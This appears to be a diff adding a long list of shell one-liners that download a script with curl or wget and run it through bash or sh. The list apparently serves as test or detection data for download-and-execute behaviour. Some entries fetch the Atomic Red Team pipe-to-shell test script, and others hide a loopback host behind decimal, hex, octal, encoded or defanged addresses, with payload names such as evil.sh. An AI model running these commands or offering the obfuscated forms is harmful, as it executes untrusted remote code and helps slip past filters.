+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -u
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -x
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash -c
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /bin/bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/bin/bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/local/bin/bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /bin/sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/bin/sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | /usr/local/bin/sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -s
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -e
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -u
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | sh -x
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | cat > /dev/null
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | tee /dev/null | bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > fetched.sh && bash fetched.sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > f.sh && . f.sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > temp.sh && /bin/bash temp.sh
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/a && bash /tmp/a
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; cd /tmp; ls -la /tmp/art.txt
+ls -la /tmp/art.txt; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; cd /tmp
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; cd /tmp; ls -la /tmp/art.txt
+cd /tmp; ls -la /tmp/art.txt; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+ls -la /tmp/art.txt; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la /tmp/art.txt; cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && cd /tmp && ls -la /tmp/art.txt
+ls -la /tmp/art.txt && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && cd /tmp
+cd /tmp && ls -la /tmp/art.txt && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+cd /tmp && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && cd /tmp && ls -la /tmp/art.txt
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; ls -la /tmp/art.txt; cd /tmp
+ls -la /tmp/art.txt; bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; cd /tmp
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la /tmp/art.txt && cd /tmp
+ls -la /tmp/art.txt && cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; cd /tmp; ls -la /tmp/art.txt
+ls -la /tmp/art.txt && bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && cd /tmp
+cd /tmp && bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh) && ls -la /tmp/art.txt
+bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh) && ls -la /tmp/art.txt && cd /tmp
+ls -la /tmp/art.txt && bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh) && cd /tmp
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | tee /tmp/f.sh | bash && ls -la /tmp/art.txt
+bash /tmp/f.sh; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh; ls -la /tmp/art.txt
+ls -la /tmp/art.txt; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh; bash /tmp/f.sh
+bash /tmp/f.sh && ls -la /tmp/art.txt && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh
+cd /tmp; bash /tmp/f.sh; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh; ls -la /tmp/art.txt
+ls -la /tmp/art.txt && bash /tmp/f.sh && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh > /tmp/f.sh; bash /tmp/f.sh && ls -la /tmp/art.txt
+ls -la /tmp/art.txt; bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; cd /tmp
+bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && cd /tmp; ls -la /tmp/art.txt
+cd /tmp; bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la /tmp/art.txt
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; ls -la /tmp/art.txt; cd /tmp
+ls -la /tmp/art.txt; cd /tmp; bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la /tmp/art.txt; cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; cd /tmp; ls -la art.txt
+bash -c "$(cd /tmp && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la /tmp/art.txt
+cd /tmp; bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la art.txt
+ls -la /tmp/art.txt; cd /tmp && bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && ls -la /tmp/art.txt && cd /tmp
+cd /tmp && ls -la art.txt && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+bash -c "$(curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; cd /tmp; ls -la /tmp/art.txt
+ls -la /tmp/art.txt && curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && cd /tmp
+curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | tee /dev/null | bash && ls -la /tmp/art.txt
+cd /tmp && ls -la /tmp/art.txt && bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && cd /tmp && ls -la art.txt
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; cd /tmp; ls -la /tmp/art.txt
+ls -la /tmp/art.txt && cd /tmp && bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)
+bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh) && cd /tmp && ls -la /tmp/art.txt
+cd /tmp && bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && ls -la art.txt
+bash -c "$(cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"; ls -la /tmp/art.txt
+ls -la /tmp/art.txt; bash -c "$(cd /tmp && curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)"
+cd /tmp; ls -la /tmp/art.txt; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+ls -la /tmp/art.txt; bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh); cd /tmp
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && cd /tmp; ls -la art.txt
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash && ls -la art.txt && cd /tmp
+bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh) && cd /tmp; ls -la art.txt
+cd /tmp && bash -c "$(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh)" && ls -la
+cd /tmp && bash <(curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh); ls -la
+curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; ls -la /tmp; cd /tmp
+ls -la /tmp; cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash
+cd /tmp; curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh | bash; ls /tmp
+cd /tmp && curl -s http://2130706433/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0x7f000001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://017700000001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0x7f.0.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.000.000.001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://localhost/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://[::1]/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0177.0.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0x7f.0x00.0x00.0x01/script.sh | bash && ls -la /tmp/art.txt
+`cd /tmp && curl -s http://十进制地址/script.sh | bash && ls -la /tmp/art.txt` *(assumed alias or Unicode obfuscation)*
+cd /tmp && curl -s hxxp://127[.]0[.]0[.]1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.0.0.1%00/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.0.0.1%2fscript.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://%31%32%37.0.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://\x7f\x00\x00\x01/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://\u007f.0.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://[127.0.0.1]/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0x7f000001/script.sh | bash | ls -la /tmp/art.txt
+cd /tmp && curl -s http://0/0/0/1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0x7f.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://7f000001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0127.0000.00.0001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127%2E0%2E0%2E1/script.sh | bash && ls -la /tmp/art.txt
+`cd /tmp && curl -s http://⌂/script.sh | bash && ls -la /tmp/art.txt` *(if encoded hostname)*
+cd /tmp && curl -s http://[0:0:0:0:0:0:0:1]/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://127.0.0.1./script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://000000177.0.0.1/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://0177.0000.0000.0001/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://2130706433/scr.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl -s http://2130706433/ | bash && ls -la /tmp/art.txt
+cd /tmp && wget -qO- http://2130706433/script.sh | bash && ls -la /tmp/art.txt
+cd /tmp && wget -qO- http://2130706433 | bash && ls -la /tmp/art.txt
+cd /tmp && curl http://2130706433/init.sh | bash && ls -la /tmp/art.txt
+cd /tmp && curl http://2130706433 | bash && ls -la /tmp/art.txt
+curl -s http://2130706433/code | bash && ls -la /tmp/art.txt
+wget -qO- http://2130706433 | sh && ls -la /tmp/art.txt
+bash -c "$(curl -fsSL http://2130706433/payload.sh)" && ls -la /tmp/art.txt
+bash -c "$(wget -qO- http://2130706433/payload.sh)" && ls -la /tmp/art.txt
+cd /tmp && curl -s http://2130706433/1.sh | sh && ls -la /tmp/art.txt
+cd /tmp && curl -L http://2130706433/run.sh | sh && ls -la /tmp/art.txt
+curl -fsSL http://2130706433/shell.sh | bash && ls -la /tmp/art.txt
+wget http://2130706433/setup.sh -O- | sh && ls -la /tmp/art.txt
+cd /tmp && bash <(curl -s http://2130706433/run.sh) && ls -la /tmp/art.txt
+curl http://2130706433/install.sh | /bin/sh && ls -la /tmp/art.txt
+wget -O - http://2130706433/start.sh | /bin/bash && ls -la /tmp/art.txt
+cd /tmp && sh -c "$(curl -fsSL http://2130706433/load.sh)" && ls -la /tmp/art.txt
+curl -sL http://2130706433/a.sh | bash && ls -la /tmp/art.txt
+curl -k http://2130706433 | bash && ls -la /tmp/art.txt
+cd /tmp && curl --silent http://2130706433 | bash && ls -la /tmp/art.txt
+cd /tmp && curl --url http://2130706433/run | bash && ls -la /tmp/art.txt
+curl http://2130706433/test.sh -o - | bash && ls -la /tmp/art.txt
+curl http://2130706433 --output - | bash && ls -la /tmp/art.txt
+curl http://2130706433 -o - | sh && ls -la /tmp/art.txt
+bash <(wget -qO- http://2130706433/load.sh) && ls -la /tmp/art.txt
+cd /tmp && bash -c "$(curl -s http://2130706433/x.sh)" && ls -la /tmp/art.txt
+sh -c "$(curl -fsSL http://2130706433/z.sh)" && ls -la /tmp/art.txt
+curl -Ns http://2130706433/evil.sh | bash && ls -la /tmp/art.txt
+curl -s --max-time 10 http://2130706433/payload | sh && ls -la /tmp/art.txt
